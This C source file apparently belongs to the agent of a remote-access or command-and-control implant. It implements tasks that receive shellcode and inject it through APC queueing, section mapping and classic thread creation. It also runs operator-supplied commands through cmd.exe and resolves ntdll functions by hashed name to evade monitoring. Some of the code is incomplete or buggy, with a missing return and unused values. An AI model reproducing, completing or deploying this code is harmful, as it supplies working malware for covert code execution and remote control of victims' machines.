#include <Windows.h>
#include <stdio.h>
#include "Task.h"
#include "../Definitions.h"
#include "../importer/Importer.h"
#include "../memoryCollector/MemoryCollector.h"
#include "../message/Message.h"


PMESSAGE _finishTask(LPCSTR response, DWORD messageType)
{
    PBYTE payloadS = (PBYTE)allocMemory(sizeof(response));
    DWORD paylaodSize = sizeof(response);
    memcpy(payloadS, response, paylaodSize);
    return createMessage(messageType,paylaodSize, payloadS);
}

PMESSAGE pingServer()
{   
    return _finishTask("PING", PING_MESSAGE_TYPE);
}

PMESSAGE initAgentId(PBYTE payload, DWORD size)
{
    printf("initAgentId\n");
    return _finishTask("initAgentId", PING_MESSAGE_TYPE);
};

/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
                                                                /* INJECTION VIA DLL REFELCTION */

PMESSAGE injectViaDllTask(PBYTE payload, DWORD size)
{
    /* NEED REFLECTED DLL KNOWNLEDGE */
    printf("injectViaDllTask\n");
    return _finishTask("injectViaDllTask FAILED", PING_MESSAGE_TYPE);
};

/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */


/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
                                                                    /* INJECTION VIA APC */

VOID AlertableFunction1() {
    // The 2nd parameter should be 'TRUE'
    SleepEx(INFINITE, TRUE);
};

PMESSAGE injectViaApcTask(PBYTE payload, DWORD size)
{
    /*
    First byte 0 -> APC injection
    First byte >0 -> Early Bird APC injection
    VirtualAlloc/Ex is replaced with NtAllocateVirtualMemory
    VirtualProtect/Ex is replaced with NtProtectVirtualMemory
    WriteProcessMemory is replaced with NtWriteVirtualMemory
    CreateThread/RemoteThread is replaced with NtCreateThreadEx
    */
   NTSTATUS  STATUS = 0x00;
   fnNtAllocVirtualMemory allocVirtualMemory = (fnNtAllocVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTALLOCATEVIRTUALMEMORY_FUNCTION);
   fnNtProtectVirtualMemory protectVirtualMemory = (fnNtProtectVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTPROTECTVIRTUALMEMORY_FUNCTION);
   fnNtWritetVirtualMemory writeVirtualMemory = (fnNtWritetVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTWRITEVIRTUALMEMORY_FUNCTION);
   fnNtCreateThreadEx createThread = (fnNtCreateThreadEx)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCREATETHREAD_FUNCTION);
   fnNtQueueApcThread apcQueue = (fnNtQueueApcThread)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTAPCQUEUETASK_FUNCTION);
   /*
   ---------------------------------------------------------
   |    TYPE    |                SHELLCODE                  |
   ---------------------------------------------------------
   */
   DWORD objectivePID = payload[3] << 24 | payload[2] << 16 | payload[1] << 8 | payload[0];  
   PVOID shellcode = payload + 4;
   ULONG oldProtection = 0;
   HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
   PVOID copyShellcode = NULL;
   SIZE_T pSize = size - 4;
   ULONG sNumberOfBytesWritten = 0;
   PVOID dataToBeWritten = payload + 4;

   if ((STATUS = allocVirtualMemory(hprocess, &copyShellcode, 0, &pSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) != 0) 
   {
       printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
       printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
       return _finishTask("injectViaApcTask FAILED", PING_MESSAGE_TYPE);
   }

   ULONG protectedMemorySize = size - 4;
   if ((STATUS = writeVirtualMemory(hprocess, copyShellcode, dataToBeWritten, protectedMemorySize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != protectedMemorySize) 
   {
       printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
       printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, size - 4);
       printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
       return _finishTask("injectViaApcTask FAILED", PING_MESSAGE_TYPE);
   }

   HANDLE tHandle = NULL;
   if ((STATUS = createThread(&tHandle, THREAD_ALL_ACCESS, NULL, hprocess, &AlertableFunction1,  NULL, 0, 0, 0, 0,  NULL)) != 0) 
   {
       printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
       return _finishTask("injectViaApcTask FAILED", PING_MESSAGE_TYPE);
   }

   if ((STATUS = apcQueue(tHandle, copyShellcode, NULL, NULL, 0)) != 0) 
   {
        printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
        return _finishTask("injectViaApcTask FAILED", PING_MESSAGE_TYPE);
    }

    printf("injectViaApcTask\n");
    return _finishTask("injectViaApcTask SUCCESSFUL", PING_MESSAGE_TYPE);
};

/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */


/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
                                                                    /* INJECTION VIA FILE MAPPING */

PMESSAGE injectViaFileMappingTask(PBYTE payload, DWORD size)
{
    /*
        CreateFileMapping is replaced with NtCreateSection
        MapViewOfFile is replaced with NtMapViewOfSection
        CloseHandle is replaced with NtClose
        UnmapViewOfFile is replaced with NtUnmapViewOfSection
    */
    fnNtCreateSection createSection = (fnNtCreateSection)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCREATESECTION_FUNCTION);
    fnNtMapViewOfSection mapViewOfSection = (fnNtMapViewOfSection)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_MAPVIEWOFSECTION_FUNCTION);
    fnNtUnmapViewOfSection unmapView = (fnNtUnmapViewOfSection)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_MAPVIEWOFSECTION_FUNCTION);
    fnNtClose close = (fnNtClose)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCLOSE_FUNCTION);
    fnNtCreateThreadEx createThread = (fnNtCreateThreadEx)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCREATETHREAD_FUNCTION);
   
    NTSTATUS STATUS = 0x00;
    HANDLE hSection = NULL;
    LARGE_INTEGER lInteger = 
    {
    .LowPart = size
    };

    if ((STATUS = createSection(&hSection, SECTION_ALL_ACCESS, NULL, &lInteger, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) 
    {
        printf("[!] createSection Failed With Error : 0x%0.8X \n", STATUS);
        return _finishTask("injectViaFileMappingTask FAILED", PING_MESSAGE_TYPE);
    }

    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    PVOID copyShellcode = NULL;
    SIZE_T pSize = size;
    if ((STATUS = mapViewOfSection(hSection, hprocess, &copyShellcode, 0, 0, NULL, &pSize, ViewShare, 0, PAGE_EXECUTE_READWRITE)) != 0) 
    {
        printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
        return _finishTask("injectViaFileMappingTask FAILED", PING_MESSAGE_TYPE);
    }

    memcpy(copyShellcode, payload, size);
    HANDLE tHandle = 0;
    if ((STATUS = createThread(&tHandle, THREAD_ALL_ACCESS, NULL, hprocess, copyShellcode,  NULL,0, 0, 0, 0,  NULL)) != 0) 
    {
        printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
        return _finishTask("injectViaFileMappingTask FAILED", PING_MESSAGE_TYPE);
        
    }

    WaitForSingleObject(tHandle, 10000);
    printf("injectViaFileMappingTask SUCCESSFUL\n");
    return _finishTask("injectViaFileMappingTask SUCCESSFUL", PING_MESSAGE_TYPE);
};

/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */

/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
                                                                /* INJECTION VIA CLASSIC INJECTION */

PMESSAGE injectViaClassicProcessTask(PBYTE payload, DWORD size)
{
    /*
    VirtualAlloc/Ex is replaced with NtAllocateVirtualMemory
    VirtualProtect/Ex is replaced with NtProtectVirtualMemory
    WriteProcessMemory is replaced with NtWriteVirtualMemory
    CreateThread/RemoteThread is replaced with NtCreateThreadEx
    */
    NTSTATUS  STATUS = 0x00;
    fnNtAllocVirtualMemory allocVirtualMemory = (fnNtAllocVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTALLOCATEVIRTUALMEMORY_FUNCTION);
    fnNtProtectVirtualMemory protectVirtualMemory = (fnNtProtectVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTPROTECTVIRTUALMEMORY_FUNCTION);
    fnNtWritetVirtualMemory writeVirtualMemory = (fnNtWritetVirtualMemory)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTWRITEVIRTUALMEMORY_FUNCTION);
    fnNtCreateThreadEx createThread = (fnNtCreateThreadEx)getProcAddrCen(CRYPT_NTDLL_DLL_ROUTE, HASH_NTCREATETHREAD_FUNCTION);
    /*
    ---------------------------------------------------------
    |    PID    |                SHELLCODE                  |
    ---------------------------------------------------------
    */
    DWORD objectivePID = payload[3] << 24 | payload[2] << 16 | payload[1] << 8 | payload[0];  
    PVOID shellcode = payload + 4;
    ULONG oldProtection = 0;
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    PVOID copyShellcode = NULL;
    SIZE_T pSize = size - 4;
    ULONG sNumberOfBytesWritten = 0;
    PVOID dataToBeWritten = payload + 4;

    if ((STATUS = allocVirtualMemory(hprocess, &copyShellcode, 0, &pSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) != 0) 
    {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
        return _finishTask("injectViaClassicProcessTask FAILED", PING_MESSAGE_TYPE);
	}

    ULONG protectedMemorySize = size - 4;
    if ((STATUS = writeVirtualMemory(hprocess, copyShellcode, dataToBeWritten, protectedMemorySize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != protectedMemorySize) 
    {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, size - 4);
        return _finishTask("injectViaClassicProcessTask FAILED", PING_MESSAGE_TYPE);
	}

    HANDLE tHandle = NULL;
    if ((STATUS = createThread(&tHandle, THREAD_ALL_ACCESS, NULL, hprocess, copyShellcode,  NULL,0, 0, 0, 0,  NULL)) != 0) 
    {
        printf("[!] createThread Failed With Error : 0x%0.8X \n", STATUS);
        return _finishTask("injectViaClassicProcessTask FAILED", PING_MESSAGE_TYPE);
	}

    printf("injectViaClassicProcessTask\n");
    return _finishTask("injectViaClassicProcessTask SUCCESSFUL", PING_MESSAGE_TYPE);

};

/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */

/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */
                                                                /* COMMAND EXECUTION */

PMESSAGE executeCommandTask(PBYTE payload, DWORD size)
{   
    /*
    ---------------------------------------------------------
    |                   command to execute                  |
    ---------------------------------------------------------
    Read end of one pipe serves as standard input for the child process
    Write end of the other pipe is the standard output for the child process
    Parent process uses the opposite ends of these two pipes to write to the child process's input and read from the child process's output
    */
   for(int i = 0; i < size; i++)
   {
    payload[i] -= 1;
   }
   
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;

    SECURITY_ATTRIBUTES saAttr; 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL; 

    // Create a pipe for the child process's STDOUT. 
 
   if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
    {
        return _finishTask("PROCESS CREATION FAILED", PING_MESSAGE_TYPE);
    } 

    // Ensure the read handle to the pipe for STDOUT is not inherited.

    if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        return _finishTask("PROCESS CREATION FAILED", PING_MESSAGE_TYPE);
    }
     
    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES; 

    CHAR commandToExecute[] = "cmd.exe /c ";
    DWORD commandLength = sizeof(commandToExecute)-1; // Remove NULL char
    CHAR commandLineArg[MAX_COMMAND_LINE_ARGS_LENGTH];
    memcpy(commandLineArg, commandToExecute, commandLength);
    memcpy(commandLineArg + commandLength,payload, size);


    BOOL bSuccess = CreateProcess
    (   NULL, 
        commandLineArg,     
        NULL,          
        NULL,          
        TRUE,          // handles are inherited 
        0,             // creation flags
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo
    );  // receives PROCESS_INFORMATION 

    PBYTE commandOutput[MAX_COMMAND_LINE_OUTPUT_BUFFER_SIZE];
    DWORD bytesRead = 0;
    PMESSAGE messateToReturn;
    if(!ReadFile(hChildStd_OUT_Rd, commandOutput, MAX_COMMAND_LINE_ARGS_LENGTH, &bytesRead, NULL))
    {
        printf("[-] Command execution failed");
        messateToReturn = _finishTask("executeCommandTask FAILED", PING_MESSAGE_TYPE);
    }

    printf("Commnad Line:\n%s",commandOutput);
    CloseHandle(hChildStd_OUT_Rd);
    CloseHandle(hChildStd_OUT_Wr);
    messateToReturn = _finishTask("executeCommandTask SUCCESSFUL", PING_MESSAGE_TYPE);
}

/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------- */

PMESSAGE listProcess(PBYTE payload, DWORD size)
{
    
}

